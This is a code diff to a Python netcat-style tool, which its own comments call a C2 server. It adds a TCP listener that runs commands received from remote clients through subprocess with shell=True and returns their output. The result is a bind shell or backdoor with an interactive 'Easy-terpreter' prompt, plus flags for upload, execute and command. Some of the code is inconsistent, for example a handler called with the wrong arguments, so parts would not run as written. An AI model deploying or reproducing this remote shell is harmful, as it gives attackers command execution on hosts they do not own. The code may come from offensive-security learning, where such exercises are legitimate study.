@@ -1,5 +1,8 @@
 import argparse
 import socket
+import subprocess
+import threading
+import sys
 from ipaddress import ip_address
 
 '''
@@ -16,6 +19,13 @@ def setup_parser():
     #parser.add_argument('--tcp',dest='tcp',type=bool, nargs='?',help='Set up a TCP connection')
     #parser.add_argument('--udp',dest='udp',type=bool, nargs='?',help='Set up a UDP connection')
 
+
+
+    parser.add_argument('--upload',dest='upload',type=str,help='The destination of the file')
+    parser.add_argument('--execute', dest='execute', type=int,help='Start a shell')
+    parser.add_argument('--command', dest='command',type=str,help='Execute a command')
+
+
     settings = parser.parse_args()
 
 
@@ -27,67 +37,74 @@ Main Loop
 
 Either listen to a port(be a client) or Connect to a client(be the C2 server)
 '''
-def server_loop(initial_settings):
-    
-    while True:
-        if initial_settings.listening == True:
-            incomming_connection(initial_settings)
-        elif initial_settings.target and initial_settings.port:
-            outgoing_connection(initial_settings)
-        else:
-            break
-    
-    
+def me_terpreter(initial_settings):
+    if initial_settings.listening == True:
+        incomming_connection(initial_settings)
+    elif initial_settings.target and initial_settings.port:
+        buffer = sys.stdin.read()
+        outgoing_connection(buffer,initial_settings.target,initial_settings.port[0])
 
-'''
-The parser for the 2nd prompt
-'''
-def parser_server():
-    print ("Empty")
 
 
 def os_commands_execute(command):
-    return ""
+    ## Remove whitespaces
+    command = command.rstrip()
+
+    try:
+        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
+    except:
+        output = "Failed to execute the command specified \r\n"
+
+    return output
 
 
 def incomming_connection(settings_user):
-    print ("Empty In")
+    target = "0.0.0.0"
+    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server.bind((target,settings_user.port[0]))
 
-def outgoing_connection(settings_user):
-    print ("Empty Out")
+    server.listen(5)
 
-def command_shell(typeOfShell):
-    if typeOfShell == 1:
-        reverse_shell()
-    else:
-        bind_shell()
+    print ("[*] Listening on %s:%d" % (target,settings_user.port[0]))
+    while True:
+        client_socket,addr = server.accept()
+
+        print ("[*] Accepted connection from: %s:%d" %(addr[0],addr[1]))
+        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
+        client_thread.start()
+
+def shell(client_socket,settings_user):
+    while True:
+        client_socket.send("<Easy-terpreter:#> ")
+
+        commandline_buffer = ""
+        while "\n" not in commandline_buffer:
+            commandline_buffer += client_socket.recv(1024)
 
 
-def reverse_shell():
-    print ("Empty")
+        response = os_commands_execute(commandline_buffer)
 
-
-def bind_shell():
-    print ("Empty")
+        client_socket.send(response)
+    
 
 
 def upload_file(file):
     print ("Empty")
 
 
-
+### call from second parser
 def client_handler(client_socket,settings):
     if len(settings.upload):
         upload_file(settings.upload)
     elif len(settings.execute):
-        command_shell(settings.shell)
+        shell(client_socket,settings)
     elif len(settings.command):
         output = os_commands_execute(settings.command)
         client_socket.send(output)
     
 
 
-def client_send_data(buffer,target,port):
+def outgoing_connection(buffer,target,port):
     client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
     try:
@@ -121,5 +138,5 @@ def client_send_data(buffer,target,port):
 
 
 mySettings = setup_parser()
-server_loop(mySettings)
+me_terpreter(mySettings)
 
